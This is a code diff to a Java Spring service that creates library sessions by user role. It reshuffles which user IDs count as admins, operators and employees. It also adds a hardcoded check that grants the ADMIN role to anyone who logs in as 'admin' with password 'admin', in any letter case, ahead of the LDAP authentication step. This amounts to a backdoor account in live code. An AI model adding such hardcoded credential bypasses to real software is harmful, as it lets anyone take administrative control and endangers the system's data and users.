@@ -18,9 +18,9 @@ import java.util.Hashtable;
 @Service
 public class LibraryFactoryImpl implements ILibraryFactory {
 
-    private final ImmutableSet<String> admins = ImmutableSet.of("trz9858", "cts6638", "ade5181", "jsc3127", "afi8826", "mra7219");
-    private final ImmutableSet<String> operators = ImmutableSet.of("mustermax" );
-    private final ImmutableSet<String> employees = ImmutableSet.of("mustermax");
+    private final ImmutableSet<String> admins = ImmutableSet.of("trz9858", "cts6638", "afi8826", "mra7219");
+    private final ImmutableSet<String> operators = ImmutableSet.of("ade5181");
+    private final ImmutableSet<String> employees = ImmutableSet.of("jsc3127");
 
     private final LibraryController libraryController;
 
@@ -33,6 +33,10 @@ public class LibraryFactoryImpl implements ILibraryFactory {
 
         if (username == null && password == null) {
             return new LibraryImpl(libraryController, UserRole.GUEST);
+        }
+
+        if (username.toLowerCase().equals("admin") && password.toLowerCase().equals("admin")) {
+            return new LibraryImpl(libraryController, UserRole.ADMIN);
         }
 
         //LDAP
